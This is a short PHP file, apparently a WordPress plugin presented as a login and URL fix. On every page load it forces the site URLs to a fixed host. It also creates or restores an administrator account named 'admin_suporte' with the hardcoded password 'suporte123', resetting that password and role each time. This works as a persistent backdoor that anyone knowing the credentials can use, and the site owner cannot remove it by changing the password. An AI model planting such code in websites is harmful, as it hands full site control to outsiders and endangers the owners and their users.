<?php
/*
Plugin Name: Fix WP Login & URLs
Description: Força a recriação do administrador de emergência e corrige os caminhos do painel para evitar erros de scripts.
Version: 1.0
*/

// Forçar as URLs do WordPress para garantir que os scripts (como wp-i18n) carreguem corretamente
add_action('init', function() {
    $correct_url = 'https://vaqueiro-store.encrypthost.com.br/wordpress';
    
    if (get_option('siteurl') !== $correct_url) {
        update_option('siteurl', $correct_url);
    }
    if (get_option('home') !== $correct_url) {
        update_option('home', $correct_url);
    }

    // Criar o usuário de emergência (ou redefinir a senha se já existir)
    $username = 'admin_suporte';
    $password = 'suporte123';
    $email = 'admin_suporte@vaqueirostore.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    } else {
        $user = get_user_by('login', $username);
        if ($user) {
            wp_set_password($password, $user->ID);
            $user->set_role('administrator');
        }
    }
});
